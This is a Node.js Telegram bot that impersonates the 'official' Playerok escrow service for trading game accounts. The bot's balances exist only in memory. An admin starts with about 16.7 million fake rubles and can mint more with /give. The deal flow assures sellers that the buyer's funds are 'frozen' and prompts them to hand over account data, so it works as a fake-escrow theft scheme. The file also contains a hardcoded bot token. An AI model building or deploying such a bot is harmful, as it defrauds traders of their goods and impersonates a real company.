const { Telegraf, Markup } = require('telegraf');
const http = require('http');
const bot = new Telegraf('8849870102:AAGiJ0uvDWHKAH3sFYCWQECSgJmNFC0zsnY');
const ADMIN = 'k13_way', ADMIN_ID = 8886821631;
let users = {}, deals = {}, states = {};

http.createServer((req, res) => { res.writeHead(200); res.end('OK'); }).listen(process.env.PORT || 10000);

function init(id, name) {
    const un = name ? name.toLowerCase() : '';
    if (!users[id]) users[id] = { id, username: un, balance: id === ADMIN_ID ? 16699677 : 0, count: 0 };
    else if (un) users[id].username = un;
}
function findId(name) {
    const cl = name.replace('@', '').trim().toLowerCase();
    for (const id in users) { if (users[id].username === cl) return parseInt(id); }
    return null;
}
const menu = Markup.keyboard([['🤝 Создать сделку'], ['💳 Баланс', '🛡️ Безопасность'], ['ℹ️ О Гарант Боте Playerok', '🆘 Поддержка']]).resize();

bot.start((ctx) => { 
    init(ctx.from.id, ctx.from.username); 
    ctx.replyWithMarkdown('Добро пожаловать 👋\n\n✅ *PlayerOk* — специализированный маркетплейс и торговый гарант по обеспечению полной безопасности внебиржевых сделок.\n\n🥇 *Автоматизированный алгоритм исполнения.*\n🔎 *Скорость, верификация и защита.*\n💳 *Удобный и моментальный вывод средств.*\n\n• Комиссия сервиса: 1%\n• Режим работы системы: 24/7\n• Главный модератор: @sw1zyy01\n\n🛡️ *Выберите нужный раздел на панели ниже:*', menu); 
});

bot.hears('ℹ️ О Гарант Боте Playerok', (ctx) => {
    ctx.reply('💎 Playerok Гарант бот — это внутренние безопасные сделки прямо в Telegram! 🛡️ Все текущие операции и конфиденциальные данные участников надёжно шифруются и хранятся в официальной базе данных Playerok Cloud. Если быстрые и на 100% безопасные сделки — то только на Playerok! ✨');
});

bot.hears('🛡️ Безопасность', (ctx) => {
    ctx.reply('🛡️ Официальный Гарант сервис Playerok защищает ваши средства от любых видов мошенничества. 📊 Деньги покупателя замораживаются на транзитном счёте гаранта и переводятся продавцу только ПОСЛЕ полной проверки и подтверждения получения товара. Не ведитесь на фейков! С любовью, команда Playerok. ❤️');
});

bot.hears('🆘 Поддержка', (ctx) => {
    ctx.reply('🆘 Официальная служба поддержки Playerok Гарант ПРЯМО в Telegram!\n\n⚖️ В случае возникновения любых спорных моментов, задержек или попыток обмана в сделке, незамедлительно обращайтесь к нашему старшему модератору арбитража: @sw1zyy01. Пожалуйста, прикрепите медийные доказательства (скриншоты или видеозапись экрана).\n\nВаша безопасность — наш главный приоритет! ✨');
});

bot.hears('💳 Баланс', (ctx) => {
    init(ctx.from.id, ctx.from.username);
    const u = users[ctx.from.id];
    ctx.replyWithMarkdown(`👑 *ЛИЧНЫЙ КАБИНЕТ PLAYEROK* 👑\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n👤 *Пользователь:* @${ctx.from.username || 'не установлен'}\n💎 *Статус профиля:* Проверенный трейдер\n📈 *Успешных сделок:* ${u.count}\n\n💵 *Текущий баланс:* [ ${u.balance.toLocaleString('ru-RU')} руб. ]\n\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n✨ _Проводите безопасные сделки, используя юзернеймы участников!_`);
});

bot.command('give', (ctx) => {
    if (ctx.from.username?.toLowerCase() !== ADMIN) return ctx.reply('❌ У вас нет прав администратора.');
    const args = ctx.message.text.split(' ');
    if (args.length !== 3) return ctx.reply('⚠️ Формат команды: /give [ID] [Сумма]');
    const tId = parseInt(args[1]), am = parseInt(args[2]);
    if (isNaN(tId) || isNaN(am) || am <= 0) return ctx.reply('❌ Ошибка введенных данных.');
    init(tId, null); users[tId].balance += am; ctx.reply(`✅ Успешно зачислено ${am} руб.`);
    bot.telegram.sendMessage(tId, `💰 Ваш баланс успешно пополнен администратором на: +${am} руб.`).catch(()=>{});
});

bot.hears('🤝 Создать сделку', (ctx) => {
    ctx.reply('👉 Выберите вашу роль в создаваемой безопасной сделке:', Markup.inlineKeyboard([[Markup.button.callback('🛒 Я хочу Купить', 'r_buy'), Markup.button.callback('💰 Я хочу Продать', 'r_sell')]]));
});

bot.action('r_buy', (ctx) => { 
    states[ctx.from.id] = { step: 'info', type: 'buy' }; 
    ctx.answerCbQuery().catch(()=>{}); 
    ctx.replyWithMarkdown('🛒 *ОФОРМЛЕНИЕ ПОКУПКИ ТОВАРА*\n\n📝 Отправьте данные сделки *одним сообщением* строго по шаблону:\n`[Сумма] [Название товара] [Юзернейм Продавца]`\n\n📋 *Пример:* `2500 Standoff 2 Account @user_name` \n\n⚠️ _Важно: Второй участник (продавец) должен запустить этого бота (нажать /start) хотя бы один раз до начала оформления!_'); 
});

bot.action('r_sell', (ctx) => { 
    states[ctx.from.id] = { step: 'info', type: 'sell' }; 
    ctx.answerCbQuery().catch(()=>{}); 
    ctx.replyWithMarkdown('💰 *ОФОРМЛЕНИЕ ПРОДАЖИ ТОВАРА*\n\n📝 Отправьте данные сделки *одним сообщением* строго по шаблону:\n`[Сумма] [Название товара] [Юзернейм Покупателя]`\n\n📋 *Пример:* `1500 Нож в Standoff 2 @user_name` \n\n⚠️ _Важно: Второй участник (покупатель) должен запустить этого бота (нажать /start) хотя бы один раз до начала оформления!_'); 
});

bot.on('text', (ctx, next) => {
    const uid = ctx.from.id, st = states[uid];
    if (!st || st.step !== 'info') return next();
    delete states[uid];
    const match = ctx.message.text.trim().match(/^(\d+)\s+(.+?)\s+(@[A-Za-z0-9_]{4,})$/);
    if (!match) return ctx.reply('❌ Неверный формат сообщения!\n\nНажмите кнопку «🤝 Создать сделку» заново и отправьте данные строго по шаблону: [Сумма] [Товар] [@юзернейм]');
    const am = parseInt(match[1]), item = match[2], targetUser = match[3];
    const tId = findId(targetUser);
    if (!tId) return ctx.reply(`❌ Пользователь ${targetUser} не найден в нашей базе данных. Он должен сначала зайти в этого бота и нажать /start, чтобы активировать профиль!`);
    if (uid === tId) return ctx.reply('❌ Ошибка: Нельзя проводить безопасную сделку с самим собой.');
    const dId = Math.floor(100000 + Math.random() * 900000);
    const bId = st.type === 'buy' ? uid : tId, sId = st.type === 'buy' ? tId : uid;
    deals[dId] = { id: dId, bId, sId, am, item, status: 'wait' };
    ctx.reply(`⏳ Сделка №${dId} успешно оформлена! Ожидаем подтверждения от второй стороны.`);
    
    const notifyMsg = `🔔 *ВАМ ПРЕДЛОЖЕНА БЕЗОПАСНАЯ СДЕЛКА №${dId}!* 🔔\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n📦 *Товар/Услуга:* ${item}\n💰 *Сумма сделки:* ${am} руб.\n👤 *Инициатор сделки:* @${ctx.from.username || 'Пользователь'}\n\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nВы готовы принять условия гаранта и выполнить сделку?`;
    bot.telegram.sendMessage(tId, notifyMsg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🤝 Подтвердить Сделку', `ok_${dId}`)]]) }).catch(()=>{ctx.reply('❌ Не удалось отправить уведомление второму участнику.');});
});

bot.action(/^ok_(\d+)$/, (ctx) => {
    ctx.answerCbQuery().catch(()=>{});
    const dId = parseInt(ctx.match[1]), d = deals[dId];
    if (!d || ctx.from.id !== d.sId || d.status !== 'wait') return ctx.reply('❌ Ошибка: Сделка недоступна.');
    d.status = 'pay'; 
    ctx.editMessageText(`🤝 Вы приняли сделку №${dId}. Ожидайте, пока покупатель внесёт оплату.`);
    bot.telegram.sendMessage(d.bId, `🎉 Вторая сторона приняла сделку №${dId}!\n\n📦 Товар: *${d.item}*\n💰 К оплате: *${d.am} руб.*\n\nНажмите кнопку ниже для перевода средств со своего баланса на счёт гаранта:`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить покупку', `pay_${dId}`)]]) });
});

bot.action(/^pay_(\d+)$/, (ctx) => {
    ctx.answerCbQuery().catch(()=>{});
    const dId = parseInt(ctx.match[1]), d = deals[dId];
    if (!d || ctx.from.id !== d.bId || d.status !== 'pay') return ctx.reply('❌ Ошибка.');
    init(d.bId, ctx.from.username); 
    if (users[d.bId].balance < d.am) return ctx.reply(`❌ Ошибка: На вашем балансе недостаточно средств. Нужно: ${d.am} руб. Ваш баланс: ${users[d.bId].balance} руб.`);
    users[d.bId].balance -= d.am; d.status = 'send'; 
    ctx.editMessageText(`💰 Сделка №${dId} успешно оплачена! Средства заморожены на счёте Playerok. Ожидайте получения товара от продавца.`);
    bot.telegram.sendMessage(d.sId, `📢 Покупатель оплатил сделку №${dId}! Средства успешно заморожены гарантом.\n\n👉 Теперь вы можете безопасно передать данные от аккаунта/товар покупателю в ЛС. После передачи нажмите кнопку ниже:`, Markup.inlineKeyboard([[Markup.button.callback('📦 Товар передан', `sent_${dId}`)]]));
});

bot.action(/^sent_(\d+)$/, (ctx) => {
    ctx.answerCbQuery().catch(()=>{});
    const dId = parseInt(ctx.match[1]), d = deals[dId];
    if (!d || ctx.from.id !== d.sId || d.status !== 'send') return ctx.reply('❌ Ошибка.');
    d.status = 'check'; 
    ctx.editMessageText(`👌 Вы зафиксировали передачу товара по сделке №${dId}. Ожидайте проверки от покупателя.`);
    bot.telegram.sendMessage(d.bId, `🔔 Продавец отметил, что передал товар по сделке №${dId}!\n\nПроверьте полученные данные. Если всё верно, подтвердите покупку, чтобы продавец получил деньги:`, Markup.inlineKeyboard([[Markup.button.callback('✅ Подтвердить покупку', `done_${dId}`)]]));
});

bot.action(/^done_(\d+)$/, (ctx) => {
    ctx.answerCbQuery().catch(()=>{});
    const dId = parseInt(ctx.match[1]), d = deals[dId];
    if (!d || ctx.from.id !== d.bId || d.status !== 'check') return ctx.reply('❌ Ошибка.');
    d.status = 'end'; init(d.sId, null); users[d.sId].balance += d.am; users[d.bId].count++; users[d.sId].count++;
    ctx.editMessageText(`🎉 Сделка №${dId} успешно завершена! Средства переведены продавцу. Спасибо, что выбираете Playerok Гарант! ❤️`);
    bot.telegram.sendMessage(d.sId, `💰 Покупатель подтвердил получение товара по сделке №${dId}! На ваш баланс зачислено: +${d.am} руб.`);
});

bot.launch().then(() => console.log('🚀 OK'));
